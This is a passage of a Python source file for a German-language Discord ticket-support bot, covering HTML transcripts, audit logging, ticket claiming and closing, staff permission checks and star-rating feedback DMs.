    last_exc: Exception | None = None
    for _ in range(retries):
        try:
            return await coro_factory()
        except discord.HTTPException as e:
            last_exc = e
            if e.status == 429:
                retry_after = float(getattr(e, "retry_after", delay) or delay)
                await asyncio.sleep(retry_after + 0.1)
            elif e.status >= 500:
                await asyncio.sleep(delay)
                delay *= 2
            else:
                raise
        except asyncio.TimeoutError as e:
            last_exc = e
            await asyncio.sleep(delay)
            delay *= 2
    if last_exc:
        raise last_exc


# =========================================================
#  AUDIT LOG (immer Components V2)
# =========================================================

async def audit_log(
    guild: discord.Guild | None,
    *,
    title: str,
    body: str,
    accent: discord.Color | int = discord.Color.dark_grey(),
    file: discord.File | None = None,
) -> None:
    if guild is None:
        return
    ch_id = get_log_channel_id(guild.id)
    if not ch_id:
        return
    channel = guild.get_channel(ch_id)
    if channel is None:
        try:
            channel = await guild.fetch_channel(ch_id)
        except discord.HTTPException:
            return
    await channel_v2(
        channel,
        InfoLayout(title=title, body=body, accent=accent, footer=now_str()),
        file=file,
    )


# =========================================================
#  TRANSCRIPT
# =========================================================

async def generate_html_transcript_bytes(channel: discord.TextChannel) -> tuple[bytes, str]:
    """Rohdaten + Dateiname für mehrfaches Senden desselben Transkripts."""
    f = await generate_html_transcript(channel)
    try:
        f.fp.seek(0)
        data = f.fp.read()
    except Exception:
        data = b""
    name = getattr(f, "filename", None) or f"transcript-{channel.name}.html"
    return data, name


async def generate_html_transcript(channel: discord.TextChannel) -> discord.File:
    messages: list[discord.Message] = []
    try:
        async for msg in channel.history(limit=TRANSCRIPT_MSG_LIMIT, oldest_first=True):
            messages.append(msg)
    except discord.HTTPException as e:
        log.warning("Transcript history: %s", e)

    rows: list[str] = []
    for m in messages:
        avatar = html.escape(str(m.author.display_avatar.url))
        name = html.escape(m.author.display_name)
        stamp = m.created_at.strftime("%d.%m.%Y %H:%M:%S")
        text = html.escape(m.content or "")
        if m.attachments:
            atts = "<br>".join(
                f'📎 <a href="{html.escape(a.url)}">{html.escape(a.filename)}</a>'
                for a in m.attachments
            )
            text = f"{text}<br>{atts}" if text else atts
        if m.embeds and not text:
            text = "<i>[Embed/Components]</i>"
        if not text:
            text = "<i>[keine Textnachricht]</i>"
        bot_badge = ' <span class="bot">BOT</span>' if m.author.bot else ""
        rows.append(
            f"""
            <div class="message">
              <img class="avatar" src="{avatar}" alt="">
              <div class="msg-content">
                <div class="user-info">
                  <span class="username">{name}</span>{bot_badge}
                  <span class="timestamp">{stamp}</span>
                </div>
                <div class="text">{text}</div>
              </div>
            </div>
            """
        )

    doc = f"""<!DOCTYPE html>
<html lang="de"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ticket – {html.escape(channel.name)}</title>
<style>
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#313338;color:#dbdee1;margin:0;padding:24px}}
.header{{background:#2b2d31;border-radius:12px;padding:20px 24px;margin-bottom:20px;border-left:4px solid #5865f2}}
.header h1{{margin:0 0 8px;color:#fff;font-size:22px}}
.header p{{margin:0;color:#b5bac1;font-size:13px}}
.message{{display:flex;gap:12px;background:#2b2d31;padding:12px 14px;border-radius:8px;margin-bottom:10px}}
.avatar{{width:40px;height:40px;border-radius:50%;flex-shrink:0}}
.username{{font-weight:600;color:#fff;margin-right:8px}}
.bot{{background:#5865f2;color:#fff;font-size:10px;padding:1px 5px;border-radius:3px;margin-right:8px}}
.timestamp{{font-size:11px;color:#949ba4}}
.text{{line-height:1.45;white-space:pre-wrap;word-break:break-word;margin-top:4px}}
a{{color:#00a8fc}}
</style></head><body>
<div class="header">
<h1>📜 Transkript: #{html.escape(channel.name)}</h1>
<p>Erstellt am {html.escape(now_str())} · {len(messages)} Nachrichten · ID {channel.id}</p>
</div>
<div class="messages">{''.join(rows) if rows else '<p>Keine Nachrichten.</p>'}</div>
</body></html>"""
    raw = doc.encode("utf-8")
    buf = io.BytesIO(raw)
    buf.seek(0)
    return discord.File(buf, filename=f"transcript-{safe_channel_name('ticket', channel.name)}.html")


# =========================================================
#  TICKET CONTROL MESSAGE (Live-Status + Buttons)
# =========================================================

def ticket_description_block(
    *,
    meta: dict[str, Any],
    owner_mention: str,
    extra: str = "",
) -> str:
    status = str(meta.get("status") or STATUS_OPEN)
    cat = CAT_LABELS.get(str(meta.get("category", "support")), "Support")
    bar = build_status_bar(status)
    claimer_id = meta.get("claimer_id")
    if claimer_id:
        claim_line = (
            f"> **Zuständig:** <@{claimer_id}>\n"
            f"> **Geclaimt seit:** {claim_age_text(meta)}"
        )
    else:
        claim_line = "> **Zuständig:** *noch niemand*"

    created = parse_iso(meta.get("created_at"))
    age = fmt_duration((utcnow() - created).total_seconds()) if created else "—"

    body = (
        f"### Status\n{bar}\n\n"
        f"**Details**\n"
        f"> **Kategorie:** {cat}\n"
        f"> **Ersteller:** {owner_mention}\n"
        f"> **Offen seit:** {age}\n"
        f"{claim_line}\n"
    )
    if extra:
        body = f"{body}\n\n{extra}"
    return body



class TicketControlLayout(ui.LayoutView):
    """Hauptnachricht im Ticket: Live-Status-Leiste + alle Buttons."""

    def __init__(
        self,
        *,
        title: str,
        meta: dict[str, Any],
        owner_mention: str,
        extra: str = "",
        footer: str | None = "Buttons: Claimen · Freigeben · Schließen · Weiterleiten · Spaß",
    ):
        super().__init__(timeout=None)
        status = str(meta.get("status") or STATUS_OPEN)
        claimed = status in (STATUS_CLAIMED, STATUS_WAITING) and bool(meta.get("claimer_id"))
        body = f"## {title}\n{ticket_description_block(meta=meta, owner_mention=owner_mention, extra=extra)}"
        body = with_brand_footer(body, footer)
        if len(body) > 3900:
            body = body[:3890] + "…"
        container = ui.Container(accent_color=status_accent(status))
        container.add_item(ui.TextDisplay(body))
        container.add_item(ui.Separator())
        container.add_item(make_ticket_button_row(claim_disabled=claimed))
        self.add_item(container)


async def refresh_control_message(
    channel: discord.TextChannel,
    *,
    title: str | None = None,
    extra: str = "",
) -> None:
    """Aktualisiert die Live-Status-Nachricht im Ticket (eine Control-Message)."""
    meta = _ticket_meta.get(channel.id)
    if not meta:
        return
    owner_id = _ticket_owners.get(channel.id) or owner_id_from_topic(channel)
    owner_mention = f"<@{owner_id}>" if owner_id else "*unbekannt*"
    cat = CAT_LABELS.get(str(meta.get("category", "support")), "Support")
    emoji = CAT_EMOJI.get(str(meta.get("category", "support")), "🎟️")
    final_title = title or f"{emoji} Ticket ({cat})"

    # Bewerbungs-Tickets behalten App-Layout-Hinweis im Title-Prefix
    if str(meta.get("category")) == "bewerbung" and "Bewerbung" not in final_title:
        final_title = f"📝 {final_title}"

    layout = TicketControlLayout(
        title=final_title,
        meta=meta,
        owner_mention=owner_mention,
        extra=extra,
    )
    msg_id = meta.get("control_message_id")
    if msg_id:
        try:
            msg = await channel.fetch_message(int(msg_id))
            await msg.edit(view=layout)
            return
        except discord.NotFound:
            meta["control_message_id"] = None
            schedule_save()
        except (discord.HTTPException, TypeError, ValueError) as e:
            log.warning("Control-Message edit %s: %s", channel.id, e)
            # nicht sofort neu senden bei transienten Fehlern
            if not isinstance(e, discord.HTTPException) or getattr(e, "status", 0) != 429:
                meta["control_message_id"] = None
            else:
                return

    # Neu senden falls alte Nachricht weg — alte Bot-Control-Msgs aufräumen (max 5 prüfen)
    try:
        async for old in channel.history(limit=15):
            if old.author.id == (bot.user.id if bot.user else 0) and old.components:
                # nur unsere alten Control-Views (custom_id ticket_claim etc.)
                try:
                    ids = []
                    for row in old.components:
                        children = getattr(row, "children", None) or getattr(row, "components", []) or []
                        for c in children:
                            cid = getattr(c, "custom_id", None)
                            if cid:
                                ids.append(cid)
                    if any(x in {"ticket_claim", "ticket_close", "ticket_unclaim"} for x in ids):
                        if msg_id and old.id == int(msg_id):
                            continue
                        try:
                            await old.delete()
                        except discord.HTTPException:
                            pass
                except Exception:
                    pass
    except discord.HTTPException:
        pass

    sent = await channel_v2(channel, layout)
    if sent:
        set_control_message(channel.id, sent.id)


class InfoLayout(ui.LayoutView):
    def __init__(
        self,
        *,
        title: str,
        body: str,
        accent: discord.Color | int = discord.Color.blurple(),
        footer: str | None = None,
        branded: bool = True,
    ):
        super().__init__(timeout=None)
        text = f"## {title}\n{body}"
        if branded:
            text = with_brand_footer(text, footer)
        elif footer:
            text = f"{text}\n\n-# {footer}"
        if len(text) > 3900:
            text = text[:3890] + "…"
        container = ui.Container(accent_color=accent)
        container.add_item(ui.TextDisplay(text))
        self.add_item(container)


class DenyLayout(ui.LayoutView):
    """Einheitliche V2-Meldung wenn ein Button/Befehl nicht geht — mit Grund + Lösung."""

    def __init__(
        self,
        *,
        action: str,
        reason: str,
        fix: str | None = None,
        details: str | None = None,
        accent: discord.Color | int = discord.Color.red(),
        title: str | None = None,
    ):
        super().__init__(timeout=None)
        head = title or f"❌ {action} nicht möglich"
        body = (
            f"**Warum?**\n> {reason}\n"
        )
        if details:
            body += f"\n**Details**\n{details}\n"
        if fix:
            body += f"\n**So geht’s weiter**\n> {fix}\n"
        body += f"\n-# {BRAND_FOOTER}"
        text = f"## {head}\n{body}"
        if len(text) > 3900:
            text = text[:3890] + "…"
        container = ui.Container(accent_color=accent)
        container.add_item(ui.TextDisplay(text))
        self.add_item(container)


async def deny_v2(
    interaction: discord.Interaction,
    *,
    action: str,
    reason: str,
    fix: str | None = None,
    details: str | None = None,
    accent: discord.Color | int = discord.Color.red(),
    title: str | None = None,
) -> None:
    await reply_v2(
        interaction,
        DenyLayout(
            action=action,
            reason=reason,
            fix=fix,
            details=details,
            accent=accent,
            title=title,
        ),
        ephemeral=True,
    )


async def ok_v2(
    interaction: discord.Interaction,
    *,
    title: str,
    body: str,
    accent: discord.Color | int = discord.Color.green(),
    ephemeral: bool = False,
    footer: str | None = None,
) -> None:
    await reply_v2(
        interaction,
        InfoLayout(title=title, body=body, accent=accent, footer=footer or BRAND_FOOTER),
        ephemeral=ephemeral,
    )


class CloseRequestLayout(ui.LayoutView):
    def __init__(self, requester: discord.abc.User):
        super().__init__(timeout=180)
        container = ui.Container(accent_color=discord.Color.orange())
        container.add_item(
            ui.TextDisplay(
                f"## ⚠️ Schließ-Anfrage\n"
                f"{requester.mention} möchte dieses Ticket **schließen**.\n\n"
                f"> Ein **Staff-Mitglied** muss bestätigen.\n"
                f"> Danach: Transkript · Bewertungs-DM · Kanal löschen\n\n"
                f"-# {requester} · {now_str()}"
            )
        )
        container.add_item(ui.Separator())
        row = ui.ActionRow()
        row.add_item(ConfirmCloseButton())
        container.add_item(row)
        meta = {"status": STATUS_CLAIMED, "claimer_id": None, "category": "support"}
        # full buttons always
        container.add_item(make_ticket_button_row(claim_disabled=False))
        self.add_item(container)


class ForwardLayout(ui.LayoutView):
    def __init__(self, current_supporter: discord.Member):
        super().__init__(timeout=180)
        container = ui.Container(accent_color=discord.Color.blurple())
        container.add_item(
            ui.TextDisplay(
                "## 🔄 Ticket weiterleiten\n"
                "Wähle den **neuen Staff-Kollegen**.\n\n"
                f"> **Aktuell:** {current_supporter.mention}\n"
                f"> Ziel braucht eine **Staff-Rolle** (`!staff`).\n\n"
                "-# Nach Übergabe verlierst du den Schreib-Zugriff."
            )
        )
        container.add_item(ui.Separator())
        row = ui.ActionRow()
        row.add_item(ForwardUserSelect(current_supporter))
        container.add_item(row)
        container.add_item(make_ticket_button_row(claim_disabled=True))
        self.add_item(container)


class PanelLayout(ui.LayoutView):
    """Panel inkl. Live-Server-Stats."""

    def __init__(self, guild: discord.Guild | None = None, hide_bewerbung: bool = False):
        super().__init__(timeout=None)
        stats_line = self._stats_line(guild)
        container = ui.Container(accent_color=discord.Color.green())
        container.add_item(
            ui.TextDisplay(
                "## 📩 Helpdesk & Ticket Support\n"
                "Benötigst du Hilfe? Wähle unten eine **Kategorie**.\n\n"
                f"**Server-Stats**\n{stats_line}\n\n"
                "**Kategorien**\n"
                "> ❓ **Support** — allgemeine Fragen & Hilfe\n"
                "> ⚠️ **Beschwerde** — Meldungen & Vorfälle\n"
                "> 🎉 **Giveaway Claim** — Gewinne abholen\n"
                "> 📝 **Bewerbung** — Team-Bewerbung (Formular)\n\n"
                "**Regeln**\n"
                "> • Nur **ein** offenes Ticket gleichzeitig\n"
                "> • Sei höflich und geduldig\n"
                "> • Missbrauch kann zu Sperre / Timeout führen\n\n"
                "-# Support-Team · Stats aktualisieren sich beim nächsten /panel\n"
                f"-# {BRAND_FOOTER}"
            )
        )
        container.add_item(ui.Separator())
        row = ui.ActionRow()
        row.add_item(TicketCategorySelect(hide_bewerbung=hide_bewerbung))
        container.add_item(row)
        self.add_item(container)

    @staticmethod
    def _stats_line(guild: discord.Guild | None) -> str:
        if guild is None:
            return "> *Stats erscheinen nach dem Posten auf einem Server.*"
        today = guild_today_created(guild.id)
        avg_r = guild_avg_response_minutes(guild.id)
        avg_s = guild_avg_stars(guild.id)
        open_n = sum(1 for ch_id in _ticket_owners if guild.get_channel(ch_id) is not None)

        resp = f"**{avg_r:.0f} Min**" if avg_r is not None else "*noch keine Daten*"
        stars = f"**{avg_s:.1f}⭐**" if avg_s is not None else "*noch keine Bewertungen*"
        return (
            f"> 📅 **Heute:** {today} Tickets\n"
            f"> 📂 **Offen:** {open_n}\n"
            f"> ⏱️ **Ø erste Antwort:** {resp}\n"
            f"> ⭐ **Ø Bewertung:** {stars}"
        )


class TrollLayout(ui.LayoutView):
    def __init__(self):
        super().__init__(timeout=180)
        container = ui.Container(accent_color=discord.Color.dark_red())
        container.add_item(
            ui.TextDisplay(
                "## 🤡 Spaß-Ticket\n"
                "Der Ersteller wurde aus dem Kanal **entfernt**.\n\n"
                "> Wähle die **Timeout-Dauer**.\n"
                "> Danach: schließen **ohne** Bewertungs-DM.\n\n"
                "-# Nur Staff · Bot braucht Timeout-Rechte"
            )
        )
        container.add_item(ui.Separator())
        row = ui.ActionRow()
        row.add_item(TrollTimeoutSelect())
        container.add_item(row)
        self.add_item(container)


class RatingDMLayout(ui.LayoutView):
    def __init__(self, payload: dict):
        super().__init__(timeout=60 * 60 * 24 * 7)
        container = ui.Container(accent_color=discord.Color.gold())
        container.add_item(
            ui.TextDisplay(
                f"## 🌟 Wie war dein Support-Erlebnis?\n"
                f"Dein Ticket auf **{payload.get('guild_name', 'dem Server')}** wurde geschlossen.\n\n"
                f"> **Ticket:** `{payload.get('ticket_name', 'Support-Ticket')}`\n"
                f"> **Kategorie:** {payload.get('category_label', 'Support')}\n"
                f"> **Geschlossen am:** {payload.get('closed_at', now_str())}\n\n"
                f"**1–5 Sterne** wählen — danach kurzes Feedback.\n"
                f"> ⭐ = schlecht ··· ⭐⭐⭐⭐⭐ = super\n\n"
                f"Im Anhang: **HTML-Transkript**. Danke! 💜"
            )
        )
        container.add_item(ui.Separator())
        row = ui.ActionRow()
        for n in range(1, 6):
            row.add_item(StarButton(n, payload))
        container.add_item(row)
        self.add_item(container)


# =========================================================
#  BEWERTUNG
# =========================================================

class FeedbackModal(ui.Modal, title="Support-Feedback"):
    feedback_text = ui.TextInput(
        label="Dein Feedback zum Support",
        style=discord.TextStyle.paragraph,
        placeholder="Was war gut? Was können wir verbessern?",
        required=True,
        max_length=1000,
        min_length=2,
    )

    def __init__(self, stars: int, payload: dict):
        super().__init__()
        self.stars = stars
        self.payload = payload

    async def on_submit(self, interaction: discord.Interaction):
        data = self.payload
        if interaction.user.id != data.get("user_id"):
            await deny_v2(
                interaction,
                action="Feedback senden",
                reason="Diese Bewertung gehört zu einem **anderen** Nutzer.",
                fix="Nur deine eigene Bewertungs-DM verwenden.",
                title="🔒 Zugriff verweigert",
            )
            return

        text_content = (self.feedback_text.value or "").strip()
        safe_feedback = text_content.replace("```", "'''")

        await reply_v2(
            interaction,
            InfoLayout(
                title="Danke für dein Feedback!",
                body=(
                    f"Du hast mit **{self.stars}/5** bewertet.\n\n"
                    f"> {stars_bar(self.stars)}\n\n"
                    f"**Dein Kommentar**\n> {safe_feedback[:500]}\n\n"
                    "Dein Feedback hilft uns sehr! 💜"
                ),
                accent=discord.Color.gold(),
                footer=f"Bewertet am {now_str()}",
            ),
        )

        guild = bot.get_guild(int(data.get("guild_id") or 0))
        if not guild:
            return

        record_rating(
            guild.id,
            user_id=interaction.user.id,
            stars=self.stars,
            feedback=safe_feedback,
            ticket_name=str(data.get("ticket_name", "ticket")),
            claimer_id=data.get("claimer_id"),
            closer_id=data.get("closer_id"),
            category_label=str(data.get("category_label", "Support")),
        )

        channel_id = get_rating_channel_id(guild.id)
        if not channel_id:
            return
        channel = guild.get_channel(channel_id)
        if channel is None:
            try:
                channel = await guild.fetch_channel(channel_id)
            except discord.HTTPException:
                return

        user = interaction.user
        claimer_mention = f"<@{data['claimer_id']}>" if data.get("claimer_id") else "*Niemand*"
        closer_mention = f"<@{data['closer_id']}>" if data.get("closer_id") else "*Unbekannt*"
        rating_text = {
            1: "Sehr unzufrieden",
            2: "Unzufrieden",
            3: "Okay",
            4: "Zufrieden",
            5: "Begeistert",
        }.get(self.stars, "")
        accent = {
            1: discord.Color.dark_red(),
            2: discord.Color.red(),
            3: discord.Color.orange(),
            4: discord.Color.green(),
            5: discord.Color.gold(),
        }.get(self.stars, discord.Color.blurple())

        scored = data.get("claimer_id") or data.get("closer_id")
        score_line = ""
        if scored:
            row = (_supporter_stats.get(guild.id) or {}).get(str(scored)) or {}
            score_line = f"> **Supporter-Score:** `{row.get('score', 0)}` (<@{scored}>)\n"

        layout = ui.LayoutView(timeout=None)
        container = ui.Container(accent_color=accent)
        container.add_item(
            ui.TextDisplay(
                f"## ⭐ Neue Ticket-Bewertung\n"
                f"**{user.mention}** hat das Ticket bewertet.\n\n"
                f"> ### {stars_bar(self.stars)}\n"
                f"> **{self.stars} / 5 Sterne** — *{rating_text}*\n\n"
                f"📝 **Feedback**\n```\n{safe_feedback[:900]}\n```\n\n"
                f"**Details**\n"
                f"> **User:** {user.mention} (`{user.id}`)\n"
                f"> **Ticket:** `{data.get('ticket_name', 'unbekannt')}`\n"
                f"> **Kategorie:** {data.get('category_label', '—')}\n"
                f"> **Geclaimt von:** {claimer_mention}\n"
                f"> **Geschlossen von:** {closer_mention}\n"
                f"{score_line}"
                f"> **Server:** **{guild.name}**\n\n"
                f"-# {now_str()}"
            )
        )
        layout.add_item(container)
        try:
            await channel.send(view=layout)
        except discord.HTTPException as e:
            log.warning("Bewertung senden: %s", e)


class StarButton(ui.Button):
    def __init__(self, stars: int, payload: dict):
        labels = {1: "⭐", 2: "⭐⭐", 3: "⭐⭐⭐", 4: "⭐⭐⭐⭐", 5: "⭐⭐⭐⭐⭐"}
        super().__init__(
            label=labels[stars],
            style=discord.ButtonStyle.secondary if stars < 4 else discord.ButtonStyle.success,
        )
        self.stars = stars
        self.payload = payload

    async def callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.payload.get("user_id"):
            await deny_v2(
                interaction,
                action="Sterne wählen",
                reason="Diese Bewertungs-DM gehört einem **anderen** Nutzer.",
                fix="Nur deine eigene DM vom Bot bewerten.",
                title="🔒 Zugriff verweigert",
            )
            return
        try:
            await interaction.response.send_modal(FeedbackModal(self.stars, self.payload))
        except discord.HTTPException as e:
            await deny_v2(
                interaction,
                action="Sterne wählen",
                reason="Das Feedback-Fenster konnte nicht geöffnet werden.",
                fix="Discord neu laden und erneut auf die Sterne klicken.",
                details=f"> `{type(e).__name__}: {e}`",
            )


# =========================================================
#  CLOSE FLOW
# =========================================================

async def close_ticket_flow(
    *,
    interaction: discord.Interaction,
    delay: int,
    title: str,
    body: str,
    is_troll: bool = False,
    skip_rating: bool = False,
) -> None:
    channel = interaction.channel
    guild = interaction.guild
    closer = interaction.user

    if not isinstance(channel, discord.TextChannel) or guild is None:
        await reply_v2(
            interaction,
            InfoLayout(
                title="Fehler",
                body="> Nur in einem **Ticket-Textkanal**.",
                accent=discord.Color.red(),
            ),
            ephemeral=True,
        )
        return

    if channel.id in _closing_channels:
        await reply_v2(
            interaction,
            InfoLayout(
                title="Bereits in Schließung",
                body="> Dieses Ticket wird **bereits** geschlossen.",
                accent=discord.Color.orange(),
            ),
            ephemeral=True,
        )
        return

    _closing_channels.add(channel.id)
    try:
        set_ticket_status(channel.id, STATUS_CLOSING)
        await refresh_control_message(
            channel,
            extra=(
                f"**Schließung**\n"
                f"> {body}\n"
                f"> ⏳ Löschen in **{delay}s**…"
            ),
        )

        # Sofort auf Button antworten (verhindert Interaction-Timeout bei langem Transcript)
        await reply_v2(
            interaction,
            InfoLayout(
                title=title,
                body=(
                    f"{body}\n\n"
                    f"> ⏳ In **{delay} Sekunden** wird gelöscht…\n"
                    f"> Transkript wird erstellt"
                    + ("" if is_troll else " · Bewertungs-DM folgt")
                ),
                accent=discord.Color.red(),
                footer=build_status_bar(STATUS_CLOSING),
            ),
        )

        await audit_log(
            guild,
            title="🔒 Audit · Ticket-Schließung gestartet",
            body=(
                f"> **Ticket:** {channel.mention} (`{channel.name}`)\n"
                f"> **Von:** {closer.mention} (`{closer.id}`)\n"
                f"> **Modus:** {'Spaß/Timeout' if is_troll else 'Normal'}\n"
                f"> **Status:** {build_status_bar(STATUS_CLOSING)}"
            ),
            accent=discord.Color.red(),
        )

        # EINMAL Transkript erzeugen (Bytes), mehrfach als File versenden
        transcript_bytes: bytes | None = None
        transcript_name = f"transcript-{channel.name}.html"
        try:
            transcript_bytes, transcript_name = await generate_html_transcript_bytes(channel)
        except Exception as e:
            log.error("Transcript: %s", e)
            transcript_bytes = None

        def _transcript_file(name: str | None = None) -> discord.File | None:
            if not transcript_bytes:
                return None
            return discord.File(io.BytesIO(transcript_bytes), filename=name or transcript_name)

        await asyncio.sleep(max(1, delay))

        owner_id, claimer_id, meta = pop_ticket(channel.id)
        if owner_id is None:
            owner_id = owner_id_from_topic(channel)

        cat_key = (meta or {}).get("category", "support")
        cat_label = CAT_LABELS.get(str(cat_key), "Support")

        # Supporter closed counter
        if claimer_id:
            bump_supporter(guild.id, int(claimer_id), closed=True)
        elif closer and is_staff(closer, guild):
            bump_supporter(guild.id, closer.id, closed=True)

        # Transcript log (Kopie der Bytes)
        if get_log_channel_id(guild.id):
            tlog = _transcript_file()
            owner_line = f"> **Ersteller:** <@{owner_id}>" if owner_id else "> **Ersteller:** *unbekannt*"
            await audit_log(
                guild,
                title="📜 Audit · Transkript gespeichert"
                if not is_troll
                else "🤡 Audit · Spaß-Ticket Transkript",
                body=(
                    f"> **Ticket:** `{channel.name}`\n"
                    f"> **Kategorie:** {cat_label}\n"
                    f"{owner_line}\n"
                    f"> **Claimer:** {f'<@{claimer_id}>' if claimer_id else '*niemand*'}\n"
                    f"> **Geschlossen von:** {closer.mention}"
                ),
                accent=discord.Color.dark_grey() if not is_troll else discord.Color.dark_red(),
                file=tlog,
            )

        if owner_id and not is_troll and not skip_rating:
            payload = {
                "guild_id": guild.id,
                "guild_name": guild.name,
                "ticket_channel_id": channel.id,
                "ticket_name": channel.name,
                "user_id": owner_id,
                "claimer_id": claimer_id,
                "closer_id": closer.id,
                "closed_at": now_str(),
                "category_label": cat_label,
            }
            try:
                user = await bot.fetch_user(owner_id)
                dm_file = _transcript_file()
                await user.send(view=RatingDMLayout(payload), file=dm_file)
            except (discord.Forbidden, discord.HTTPException) as e:
                log.info("DM %s: %s", owner_id, e)
                await audit_log(
                    guild,
                    title="⚠️ Audit · Bewertungs-DM fehlgeschlagen",
                    body=f"> User <@{owner_id}> · `{e}`",
                    accent=discord.Color.orange(),
                )

        try:
            await channel.delete(reason=f"Ticket geschlossen von {closer}")
        except discord.HTTPException as e:
            log.warning("Delete: %s", e)
            try:
                await channel_v2(
                    channel,
                    InfoLayout(
                        title="Löschen fehlgeschlagen",
                        body=f"> `{type(e).__name__}: {e}`\n> Bitte manuell löschen.",
                        accent=discord.Color.red(),
                    ),
                )
            except discord.HTTPException:
                pass
    finally:
        _closing_channels.discard(channel.id)


# =========================================================
#  BUTTONS
# =========================================================

def make_ticket_button_row(*, claim_disabled: bool = False) -> ui.ActionRow:
    """Immer alle Buttons – inkl. Freigeben (Unclaim)."""
    row = ui.ActionRow()
    row.add_item(ClaimButton(disabled=claim_disabled))
    row.add_item(UnclaimButton())
    row.add_item(CloseButton())
    row.add_item(ForwardButton())
    row.add_item(TrollButton())
    return row




async def _deny_if_cooldown(interaction: discord.Interaction, key: str, *, action: str = "Aktion") -> bool:
    left = check_button_cooldown(interaction.user.id, key)
    if left is None:
        return False
    await deny_v2(
        interaction,
        action=action,
        reason=f"Cooldown aktiv — bitte **{left:.1f}s** warten.",
        fix="Kurz warten und den Button erneut drücken.",
        accent=discord.Color.orange(),
        title="⏳ Zu schnell geklickt",
    )
    return True


def ticket_channel_ok(interaction: discord.Interaction) -> bool:
    return isinstance(interaction.channel, discord.TextChannel) and interaction.guild is not None


async def require_ticket_channel(interaction: discord.Interaction, *, action: str) -> bool:
    if ticket_channel_ok(interaction):
        return True
    where = "diesem Kanal"
    if interaction.guild is None:
        reason = "Dieser Button funktioniert **nicht in DMs**."
        fix = "Öffne ein Ticket auf dem Server und nutze die Buttons dort."
    else:
        reason = f"Dieser Button geht nur in einem **Ticket-Kanal** (nicht in {where} / normalem Chat)."
        fix = "Wechsle in ein offenes Ticket unter der Kategorie **Tickets**."
    await deny_v2(
        interaction,
        action=action,
        reason=reason,
        fix=fix,
        details=f"> Kanal-Typ: `{type(interaction.channel).__name__}`",
    )
    return False


async def require_staff(
    interaction: discord.Interaction,
    *,
    action: str,
) -> discord.Member | None:
    member = _member(interaction)
    guild = interaction.guild
    if guild is None:
        await deny_v2(
            interaction,
            action=action,
            reason="Kein Server-Kontext.",
            fix="Nutze den Button auf dem Discord-Server.",
        )
        return None
    if not member:
        await deny_v2(
            interaction,
            action=action,
            reason="Dein Member-Objekt konnte nicht geladen werden.",
            fix="Server neu öffnen oder später erneut versuchen.",
        )
        return None
    if is_staff(member, guild):
        return member
    roles = await get_staff_roles(guild)
    await deny_v2(
        interaction,
        action=action,
        reason="Du hast **keine Staff-Rolle** für das Ticket-System.",
        fix="Frage einen Admin nach einer Staff-Rolle (`/staff`).",
        details=(
            f"> **Erlaubte Rollen:** {staff_role_mentions(roles)}\n"
            f"> **Dein User:** {member.mention}"
        ),
        title="🔒 Kein Staff-Zugriff",
    )
    return None




class ClaimButton(ui.Button):
    def __init__(self, *, disabled: bool = False):
        super().__init__(
            label="Claimen",
            style=discord.ButtonStyle.green,
            custom_id="ticket_claim",
            disabled=disabled,
            emoji="✋",
        )

    async def callback(self, interaction: discord.Interaction):
        if await _deny_if_cooldown(interaction, "claim", action="Claimen"):
            return
        if not await require_ticket_channel(interaction, action="Claimen"):
            return

        member = await require_staff(interaction, action="Claimen")
        if member is None:
            return
        if member.bot:
            await deny_v2(
                interaction,
                action="Claimen",
                reason="Bots können keine Tickets claimen.",
                fix="Ein menschliches Staff-Mitglied muss claimen.",
            )
            return
        guild = interaction.guild
        assert guild is not None
        channel = interaction.channel
        assert isinstance(channel, discord.TextChannel)

        if channel.id in _closing_channels:
            await deny_v2(
                interaction,
                action="Claimen",
                reason="Das Ticket wird **gerade geschlossen**.",
                fix="Warte bis der Kanal weg ist — Claim ist nicht mehr nötig.",
                accent=discord.Color.orange(),
            )
            return

        meta = _ticket_meta.get(channel.id, {})
        if str(meta.get("status")) == STATUS_CLOSING:
            await deny_v2(
                interaction,
                action="Claimen",
                reason="Status ist bereits **Wird geschlossen**.",
                fix="Kein Claim mehr möglich.",
                details=f"> {build_status_bar(STATUS_CLOSING)}",
                accent=discord.Color.orange(),
            )
            return

        # Eigenes Ticket darf man NIEMALS selbst claimen (auch nicht als Staff)
        owner_id = resolve_owner_id(channel)
        if owner_id and member.id == int(owner_id):
            await deny_v2(
                interaction,
                action="Claimen",
                reason="Du kannst **dein eigenes Ticket** nicht selbst claimen.",
                fix="Ein **anderes** Staff-Mitglied muss das Ticket übernehmen.",
                details=f"> **Ersteller:** <@{owner_id}>\n> {build_status_bar(str(meta.get('status') or STATUS_OPEN))}",
                title="🚫 Eigenes Ticket",
            )
            return

        existing = meta.get("claimer_id") or _ticket_claimers.get(channel.id)
        if existing and int(existing) != member.id:
            age = claim_age_text(meta)
            await deny_v2(
                interaction,
                action="Claimen",
                reason="Dieses Ticket ist **bereits an jemanden vergeben** (Doppel-Claim-Schutz).",
                fix="Bitte **Freigeben** (nur aktueller Claimer/Admin) oder **Weiterleiten** nutzen.",
                details=(
                    f"> **Aktuell zuständig:** <@{existing}>\n"
                    f"> **Geclaimt seit:** **{age}**\n"
                    f"> {build_status_bar(str(meta.get('status') or STATUS_CLAIMED))}"
                ),
                accent=discord.Color.orange(),
                title="✋ Bereits geclaimt",
            )
            return

        if existing and int(existing) == member.id:
            await deny_v2(
                interaction,
                action="Claimen",
                reason="Du hast dieses Ticket **bereits geclaimt**.",
                fix="Arbeite im Ticket weiter oder nutze **Freigeben**, wenn du es abgeben willst.",
                details=f"> **Dein Claim seit:** **{claim_age_text(meta)}**\n> {build_status_bar(STATUS_CLAIMED)}",
                accent=discord.Color.green(),
                title="✅ Schon dein Ticket",
            )
            return

        await apply_staff_view_only(channel, guild)
        await safe_set_perms(
            channel,
            member,
            view_channel=True,
            send_messages=True,
            attach_files=True,
            read_message_history=True,
        )
        set_claimer(channel.id, member.id)
        stamp = now_str()

        # First response time
        meta = _ticket_meta.get(channel.id, {})
        if not meta.get("first_response_at"):
            created = parse_iso(meta.get("created_at"))
            if created:
                delta = (utcnow() - created).total_seconds()
                meta["first_response_at"] = iso_now()
                _response_times.setdefault(guild.id, []).append(delta)
                _response_times[guild.id] = _response_times[guild.id][-200:]
                schedule_save()

        # Interaction zuerst bestätigen (gegen Timeout), dann Control-Message refreshen
        if not interaction.response.is_done():
            try:
                await interaction.response.defer()
            except discord.HTTPException:
                pass

        await refresh_control_message(
            channel,
